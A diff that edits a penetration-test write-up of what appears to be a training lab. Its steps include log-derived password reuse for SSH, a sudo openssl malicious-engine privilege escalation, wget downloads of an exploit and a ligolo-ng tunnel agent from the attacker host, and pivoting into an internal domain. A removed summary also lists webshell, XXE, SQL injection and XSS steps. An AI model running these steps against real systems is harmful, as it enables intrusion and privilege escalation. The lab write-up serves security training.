@@ -17,26 +17,6 @@ Automated testing techniques such as enumeration and vulnerability scanning are 
 - Destructive actions or Denial of Service (DoS) testing
 - Modifications to the environment without written consent from authorized Inlanefreight IT staff
 
-## Attack Summary
-
-|Step|Vector|Outcome|
-|---|---|---|
-|1|Nmap scan of external host|11 open ports identified (FTP, SSH, SMTP, DNS, HTTP, POP3, RPC, IMAP, HTTP-proxy)|
-|2|Anonymous FTP login|`flag.txt` read|
-|3|DNS zone transfer (AXFR)|Full subdomain list and a flag TXT record disclosed|
-|4|Vhost brute force (gobuster)|10+ internal vhosts discovered|
-|5|blog.inlanefreight.local fingerprinting|Drupal 9 identified, no known CVE for the version|
-|6|careers.inlanefreight.local IDOR|Flag read from another user's profile|
-|7|dev.inlanefreight.local verb tampering + header spoofing + upload filter bypass|PHP webshell uploaded, flag read|
-|8|gitlab.inlanefreight.local self-registration + /explore|New vhost `shopdev2.inlanefreight.local` and a flag disclosed|
-|9|ir.inlanefreight.local mail-masta plugin LFI|`/etc/passwd` and flag read|
-|10|monitoring.inlanefreight.local brute force + command injection + socat reverse shell|Shell as `webdev` on `dmz01`, flags read|
-|11|shopdev2.inlanefreight.local default creds + XXE|Flag read via `file:///flag.txt`|
-|12|status.inlanefreight.local SQL injection (sqlmap)|`users` and `company` tables dumped|
-|13|support.inlanefreight.local stored XSS|Admin session cookie stolen, flag read from ticket queue|
-|14|tracking.inlanefreight.local DOM XSS via `file://` XHR|`/etc/passwd` and flag read|
-|15|vpn.inlanefreight.local login|Not bypassed, no access gained|
-
 ---
 
 ## Nmap Scan
@@ -690,16 +670,18 @@ A login form is presented. No bypass or successful brute force was achieved agai
 
 ---
 
-## DMZ01 Lateral movement from webdev to srvadm
+## DMZ01 Lateral Movement from webdev to srvadm
 
-webdev is group adm, which can read /var/log files:
+> [!note] The lab environment was restarted several times over the course of this engagement, so IP addresses for the same host (e.g. `dmz01`, `DC01`, `MS01`) differ between sections below. Hostnames and the attack chain itself are unaffected.
+
+The `webdev` user is a member of the `adm` group, which grants read access to files under `/var/log`:
 
 ```bash
 webdev@dmz01:/home/webdev$ id
 uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
 ```
 
-New users are disclosed:
+New users are disclosed under `/home`:
 
 ```bash
 webdev@dmz01:/home/webdev$ ls /home
@@ -708,64 +690,29 @@ lab_adm  pixel  srvadm  tom  webdev
 
 ```bash
 webdev@dmz01:/home/webdev$ cat /etc/passwd
+```
+
+```
 root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
-syslog:x:104:110::/home/syslog:/usr/sbin/nologin
-_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
-tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
-uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
-landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
-pollinate:x:110:1::/var/cache/pollinate:/bin/false
-usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+...
 lab_adm:x:1000:1000:lab_adm:/home/lab_adm:/bin/bash
-lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
-dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 pixel:x:1001:1001::/home/pixel:/bin/sh
 tom:x:1002:1002::/home/tom:/bin/sh
 srvadm:x:1003:1003::/home/srvadm:/bin/sh
-ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
-bind:x:115:121::/var/cache/bind:/usr/sbin/nologin
-dovecot:x:116:122:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
-dovenull:x:117:123:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
-postfix:x:118:124::/var/spool/postfix:/usr/sbin/nologin
 webdev:x:1004:1004::/home/webdev:/bin/sh
-_rpc:x:119:65534::/run/rpcbind:/usr/sbin/nologin
-statd:x:120:65534::/var/lib/nfs:/usr/sbin/nologin
-webdev@dmz01:/home/webdev$ 
-
 ```
 
-by reading recent logs (?) with aureport its shows that the password for ilfserveradm has been typed out in the terminal:
+The `adm` group membership is used to read the audit logs with `aureport`, which shows a password typed into a terminal session while switching to `srvadm`:
 
-```
+```bash
 webdev@dmz01:/home/webdev$ aureport --tty | less
+```
+
+```
 Error opening config file (Permission denied)
 NOTE - using built-in logs: /var/log/audit/audit.log
 WARNING: terminal is not fully functional
--  (press RETURN)
+
 TTY Report
 ===============================================
 # date time event auid term sess comm data
@@ -777,92 +724,52 @@ TTY Report
 5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
 6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
 7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
-8. 06/01/22 07:13:36 365 1004 ? 4 sh "exit",<nl>
-9. 06/01/22 07:13:50 371 0 ? 2 bash "clear",<ret>,"aureport --ty",<ret>,"clear",
-<ret>,<up>,<up>,<left>,<left>,"t",<ret>,<up>,<ret>,<up>,<ret>,<up>,<ret>,"clear"
-,<ret>,<down>,<down>,<up>,<up>,<ret>
-10. 06/01/22 10:25:00 341 0 ? 2 docker "ls",<ret>,"cd /var/www/html",<ret>,"ls",
-<ret>,"ls -la",<ret>,"apt i",<backspace>,"update &7 apt inst",<backspace>,<backs
-pace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<b
-ackspace>,<backspace>,"& apt install nano",<ret>,"nano in",<tab>,<ret>,<down>,<d
-own>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down
->,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<
-down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<down>,<dow
-:
-
 ```
 
-ssh access as srvadm:
+The password `ILFreightnixadm!` is used to SSH in directly as `srvadm`:
+
+```bash
+ssh srvadm@inlanefreight.local
+```
 
 ```
-ssh srvadm@inlanefreight.local             
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-srvadm@inlanefreight.local's password: 
+srvadm@inlanefreight.local's password:
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Tue 10 Nov 2026 08:25:43 PM UTC
 
   System load:                      0.07
   Usage of /:                       93.7% of 13.72GB
   Memory usage:                     64%
-  Swap usage:                       0%
-  Processes:                        438
-  Users logged in:                  0
   IPv4 address for br-65c448355ed2: 172.18.0.1
   IPv4 address for docker0:         172.17.0.1
   IPv4 address for ens160:          10.129.229.147
-  IPv6 address for ens160:          dead:beef::250:56ff:fe8a:405f
   IPv4 address for ens192:          172.16.8.120
-
-  => / is using 93.7% of 13.72GB
-
- * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
-   just raised the bar for easy, resilient and secure K8s cluster deployment.
-
-   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
-
-82 updates can be applied immediately.
-16 of these updates are standard security updates.
-To see these additional updates run: apt list --upgradable
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
 
 Last login: Wed Jun  1 07:08:59 2022 from 127.0.0.1
 $ id
 uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
 ```
 
-ilfserveradm can run openssl with sudo:
+---
+
+## Privilege Escalation on DMZ01
+
+`srvadm` can run `openssl` as root with no password:
+
+```bash
+$ sudo -l
+```
 
 ```
-$ sudo -l
 Matching Defaults entries for srvadm on dmz01:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User srvadm may run the following commands on dmz01:
     (ALL) NOPASSWD: /usr/bin/openssl
-$ 
-
 ```
 
-## Privesc on DMZ01
-
-Found this article that shows how to exploit the openssl binary:
-
-https://medium.com/@shehacks_/from-sudo-openssl-to-root-privilege-escalation-with-dynamic-engine-abuse-c7e9e86ef41a
-
-Writing the exploit (brief explanation):
+This is exploited with a malicious OpenSSL dynamic engine that calls `setuid(0)` and spawns a shell, following a known technique for `sudo openssl` abuse ([reference](https://medium.com/@shehacks_/from-sudo-openssl-to-root-privilege-escalation-with-dynamic-engine-abuse-c7e9e86ef41a)):
 
 ```c
 #include <openssl/engine.h>
@@ -878,266 +785,168 @@ IMPLEMENT_DYNAMIC_BIND_FN(bind)
 IMPLEMENT_DYNAMIC_CHECK_FN()
 ```
 
-Compiling and sending to the target:
+bash
 
 ```bash
-gcc -fPIC -c exploit.c 
+gcc -fPIC -c exploit.c
 gcc -shared -o exploit.so exploit.o -lcrypto
 ```
 
-```
+The compiled engine is transferred to the target and loaded through `sudo openssl`:
+
+bash
+
+```bash
 $ wget http://10.10.15.11:8081/exploit.so
+```
+
+```
 --2026-11-10 20:38:40--  http://10.10.15.11:8081/exploit.so
 Connecting to 10.10.15.11:8081... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 15712 (15K) [application/octet-stream]
-Saving to: ‘exploit.so’
+Saving to: 'exploit.so'
 
-exploit.so                  100%[===========================================>]  15.34K  --.-KB/s    in 0.04s   
+exploit.so                  100%[===========================================>]  15.34K  --.-KB/s    in 0.04s
 
-2026-11-10 20:38:40 (393 KB/s) - ‘exploit.so’ saved [15712/15712]
+2026-11-10 20:38:40 (393 KB/s) - 'exploit.so' saved [15712/15712]
+```
 
+bash
+
+```bash
 $ chmod +x exploit.so
 $ sudo openssl req -engine ./exploit.so
 root@dmz01:/home/srvadm# id
 uid=0(root) gid=0(root) groups=0(root)
-root@dmz01:/home/srvadm# 
-
 ```
 
-## Root flag
+Root access is obtained on `dmz01`.
 
-```
+---
+
+## Flag (DMZ01 Root)
+
+bash
+
+```bash
 root@dmz01:~# ls
 flag.txt  snap
 root@dmz01:~# cat flag.txt
-a34985b5976072c3c148abc751671302
-root@dmz01:~# 
+```
 
+**Flag:**
+
+```
+a34985b5976072c3c148abc751671302
 ```
 
 ---
 
-## Pivoting with ligolo
+## Pivoting to the Internal Network (ligolo-ng)
 
-Lots of interfaces, but the area of interest is the one scoped, so 172.16.8.0/23 is the interface to set the pivot to:
+`dmz01` has several interfaces, but the one on the in-scope range is `ens192`:
+
+bash
+
+```bash
+root@dmz01:~# ifconfig
+```
 
 ```
-root@dmz01:~# ifconfig
-br-65c448355ed2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
-        inet6 fe80::42:5fff:fe83:fef5  prefixlen 64  scopeid 0x20<link>
-        ether 02:42:5f:83:fe:f5  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 10  bytes 1076 (1.0 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
 docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
-        inet6 fe80::42:b3ff:fe78:d49b  prefixlen 64  scopeid 0x20<link>
-        ether 02:42:b3:78:d4:9b  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 4  bytes 384 (384.0 B)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
 ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 10.129.229.147  netmask 255.255.0.0  broadcast 10.129.255.255
-        inet6 fe80::250:56ff:fe8a:405f  prefixlen 64  scopeid 0x20<link>
         inet6 dead:beef::250:56ff:fe8a:405f  prefixlen 64  scopeid 0x0<global>
-        ether 00:50:56:8a:40:5f  txqueuelen 1000  (Ethernet)
-        RX packets 17032  bytes 1392847 (1.3 MB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 3301  bytes 2439029 (2.4 MB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
 ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.16.8.120  netmask 255.255.0.0  broadcast 172.16.255.255
-        inet6 fe80::250:56ff:fe8a:e58f  prefixlen 64  scopeid 0x20<link>
         ether 00:50:56:8a:e5:8f  txqueuelen 1000  (Ethernet)
-        RX packets 1205  bytes 81229 (81.2 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 54  bytes 4656 (4.6 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
-        inet 127.0.0.1  netmask 255.0.0.0
-        inet6 ::1  prefixlen 128  scopeid 0x10<host>
-        loop  txqueuelen 1000  (Local Loopback)
-        RX packets 4114  bytes 322406 (322.4 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 4114  bytes 322406 (322.4 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-veth6866044: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet6 fe80::ecf2:63ff:fe42:5dfa  prefixlen 64  scopeid 0x20<link>
-        ether ee:f2:63:42:5d:fa  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 15  bytes 1146 (1.1 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-veth12a21e7: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet6 fe80::bc9e:8cff:fe33:b3b5  prefixlen 64  scopeid 0x20<link>
-        ether be:9e:8c:33:b3:b5  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 16  bytes 1256 (1.2 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-veth2dc940b: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet6 fe80::44b3:e8ff:feb6:75cb  prefixlen 64  scopeid 0x20<link>
-        ether 46:b3:e8:b6:75:cb  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 17  bytes 1366 (1.3 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-veth3a8bb86: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet6 fe80::88a2:3eff:fee8:6eea  prefixlen 64  scopeid 0x20<link>
-        ether 8a:a2:3e:e8:6e:ea  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 15  bytes 1146 (1.1 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-veth607e66c: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet6 fe80::81b:59ff:fe91:83e6  prefixlen 64  scopeid 0x20<link>
-        ether 0a:1b:59:91:83:e6  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 15  bytes 1146 (1.1 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-veth6fb53c7: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet6 fe80::c455:63ff:febc:94e1  prefixlen 64  scopeid 0x20<link>
-        ether c6:55:63:bc:94:e1  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 15  bytes 1146 (1.1 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-veth9475f2b: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet6 fe80::c0c3:61ff:fe04:9d31  prefixlen 64  scopeid 0x20<link>
-        ether c2:c3:61:04:9d:31  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 17  bytes 1366 (1.3 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-veth95a7dfd: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet6 fe80::c4f0:c4ff:feb0:8843  prefixlen 64  scopeid 0x20<link>
-        ether c6:f0:c4:b0:88:43  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 16  bytes 1256 (1.2 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-vethcd2e29c: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet6 fe80::b0d0:68ff:fe7e:e7bf  prefixlen 64  scopeid 0x20<link>
-        ether b2:d0:68:7e:e7:bf  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 16  bytes 1256 (1.2 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-vethd5cf06d: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet6 fe80::58d9:3ff:fedc:f412  prefixlen 64  scopeid 0x20<link>
-        ether 5a:d9:03:dc:f4:12  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 15  bytes 1146 (1.1 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-vethe76e832: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet6 fe80::10b9:d2ff:feb0:3eac  prefixlen 64  scopeid 0x20<link>
-        ether 12:b9:d2:b0:3e:ac  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 15  bytes 1146 (1.1 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-vethf441d90: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
-        inet6 fe80::50eb:cbff:fe78:dc3a  prefixlen 64  scopeid 0x20<link>
-        ether 52:eb:cb:78:dc:3a  txqueuelen 0  (Ethernet)
-        RX packets 0  bytes 0 (0.0 B)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 15  bytes 1146 (1.1 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
-root@dmz01:~# 
-
 ```
 
-Searching for internal hosts
+> [!note] `ifconfig` also listed a dozen `veth*` interfaces belonging to Docker containers on the host; these carry no routable traffic and are omitted here.
 
-```
+A sweep of the scoped subnet confirms three live hosts:
+
+bash
+
+```bash
 root@dmz01:~# for i in {1..254} ;do (ping -c 1 172.16.8.$i | grep "bytes from" &) ;done
+```
+
+```
 64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=1.83 ms
 64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.828 ms
 64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.749 ms
 64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.019 ms
-
 ```
 
->Kali
+The ligolo-ng proxy is started on Kali:
 
-Starting the proxy:
+bash
 
 ```bash
-sudo ligolo-proxy -selfcert                               
+sudo ligolo-proxy -selfcert
 ```
 
->DMZ01
+The agent binary is served from Kali and downloaded/executed on `dmz01`:
 
-Downloading the agent (served with a python server):
+bash
 
 ```bash
 root@dmz01:~# wget http://10.10.15.11:8081/agent
+```
+
+```
 --2026-11-10 20:51:48--  http://10.10.15.11:8081/agent
 Connecting to 10.10.15.11:8081... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 7164088 (6.8M) [application/octet-stream]
-Saving to: ‘agent’
+Saving to: 'agent'
 
-agent                       100%[===========================================>]   6.83M  1.03MB/s    in 5.5s    
+agent                       100%[===========================================>]   6.83M  1.03MB/s    in 5.5s
 
-2026-11-10 20:51:53 (1.24 MB/s) - ‘agent’ saved [7164088/7164088]
-
-root@dmz01:~# chmod +x agent
-root@dmz01:~# ./^Cgolo-agent -connect 10.10.15.11:11601 -ignore-cert
-root@dmz01:~# ./agent -connect 10.10.15.11:11601 -ignore-cert
-WARN[0000] warning, certificate validation disabled     
-INFO[0000] Connection established                        addr="10.10.15.11:11601"
-
-
+2026-11-10 20:51:53 (1.24 MB/s) - 'agent' saved [7164088/7164088]
 ```
 
-The agent connected back:
+bash
+
+```bash
+root@dmz01:~# chmod +x agent
+root@dmz01:~# ./agent -connect 10.10.15.11:11601 -ignore-cert
+```
+
+```
+WARN[0000] warning, certificate validation disabled
+INFO[0000] Connection established                        addr="10.10.15.11:11601"
+```
+
+The agent connects back to the proxy:
 
 ```
 ligolo-ng » INFO[0342] Agent joined.                                 id=0050568a405f name=root@dmz01 remote="10.129.229.147:53920"
 ligolo-ng » session
 ? Specify a session : 1 - root@dmz01 - 10.129.229.147:53920 - 0050568a405f
-[Agent : root@dmz01] »  
-
+[Agent : root@dmz01] »
 ```
 
-Setting the route to the correct subnet using ligolo commands:
+A route is added for the scoped subnet and the tunnel started:
 
 ```
 [Agent : root@dmz01] » autoroute
 ? Select routes to add: 172.16.8.120/16
 ? Create a new interface or use an existing one? Create a new interface
 ? Enter interface name (leave empty for random name): tunnel
-INFO[0383] Using custom interface name: tunnel          
-INFO[0383] Interface tunnel configured (will be created on tunnel start) 
-INFO[0383] Creating routes for tunnel...                
+INFO[0383] Using custom interface name: tunnel
+INFO[0383] Interface tunnel configured (will be created on tunnel start)
+INFO[0383] Creating routes for tunnel...
 ? Start the tunnel? Yes
-INFO[0387] Starting tunnel to root@dmz01 (0050568a405f) 
-[Agent : root@dmz01] » session
-? Specify a session : 1 - root@dmz01 - 10.129.229.147:55100 - 0050568a405f
+INFO[0387] Starting tunnel to root@dmz01 (0050568a405f)
+```
+
+```
 [Agent : root@dmz01] » tunnel_list
 ┌───────────────────────────────────────────────────────────────────────────┐
 │ Active sessions and tunnels                                               │
@@ -1148,27 +957,34 @@ INFO[0387] Starting tunnel to root@dmz01 (0050568a405f)
 └───┴──────────────────────────────────────────────────┴───────────┴────────┘
 ```
 
-Checking if it works:
+The tunnel is verified with an SMB sweep:
+
+bash
+
+```bash
+netexec smb 172.16.8.0/23
+```
 
 ```
- netexec smb 172.16.8.0/23                 
 SMB         172.16.8.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None)
 SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-AEN-MS0) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None)
 Running nxc against 512 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
-
 ```
 
-Enumerating with nmap the new hosts disclosed:
+### Internal Host Enumeration
 
-This is the domain controller:
+`172.16.8.3` is confirmed as the domain controller:
+
+bash
+
+```bash
+nmap -sC -sV 172.16.8.3 --open
+```
 
 ```
-nmap -sC -sV 172.16.8.3 --open                                                                     
-Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-13 15:57 -0500
 Nmap scan report for DC01 (172.16.8.3)
 Host is up (0.092s latency).
-Not shown: 988 closed tcp ports (reset)
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-13 20:57:55Z)
@@ -1182,207 +998,123 @@ PORT     STATE SERVICE       VERSION
 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL, Site: Default-First-Site-Name)
 3269/tcp open  tcpwrapped
 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 |_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:bc:3a (VMware)
-| smb2-time: 
-|   date: 2026-11-13T20:57:57
-|_  start_date: N/A
-| smb2-security-mode: 
-|   3.1.1: 
+| smb2-security-mode:
+|   3.1.1:
 |_    Message signing enabled and required
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 20.49 seconds
-
-                                                              
 ```
 
-```
+bash
+
+```bash
 sudo nmap -sT -Pn 172.16.8.20 -sV -sC
-[sudo] password for kali: 
-Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-10 17:32 -0500
-Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
-Service scan Timing: About 87.50% done; ETC: 17:33 (0:00:04 remaining)
-Stats: 0:01:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
-NSE Timing: About 99.91% done; ETC: 17:33 (0:00:00 remaining)
+```
+
+```
 Nmap scan report for 172.16.8.20
 Host is up (0.036s latency).
-Not shown: 992 closed tcp ports (conn-refused)
 PORT     STATE SERVICE       VERSION
 80/tcp   open  http          Microsoft IIS httpd 10.0
 | http-robots.txt: 16 disallowed entries (15 shown)
-| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
-| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
+| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/
+| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/
 |_/Documentation/ /HttpModules/ /Install/ /Providers/
-| http-methods: 
+| http-methods:
 |_  Potentially risky methods: TRACE
 |_http-title: Home
 111/tcp  open  rpcbind       2-4 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/tcp6  rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  2,3,4        111/udp6  rpcbind
-|   100003  2,3         2049/udp   nfs
-|   100003  2,3         2049/udp6  nfs
 |   100003  2,3,4       2049/tcp   nfs
-|   100003  2,3,4       2049/tcp6  nfs
 |   100005  1,2,3       2049/tcp   mountd
-|   100005  1,2,3       2049/tcp6  mountd
-|   100005  1,2,3       2049/udp   mountd
-|   100005  1,2,3       2049/udp6  mountd
-|   100021  1,2,3,4     2049/tcp   nlockmgr
-|   100021  1,2,3,4     2049/tcp6  nlockmgr
-|   100021  1,2,3,4     2049/udp   nlockmgr
-|   100021  1,2,3,4     2049/udp6  nlockmgr
-|   100024  1           2049/tcp   status
-|   100024  1           2049/tcp6  status
-|   100024  1           2049/udp   status
-|_  100024  1           2049/udp6  status
 135/tcp  open  msrpc         Microsoft Windows RPC
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp  open  microsoft-ds?
 2049/tcp open  nlockmgr      1-4 (RPC #100021)
 3389/tcp open  ms-wbt-server Microsoft Terminal Services
 | ssl-cert: Subject: commonName=ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
-| Not valid before: 2026-11-09T19:42:03
-|_Not valid after:  2027-05-11T19:42:03
-| rdp-ntlm-info: 
+| rdp-ntlm-info:
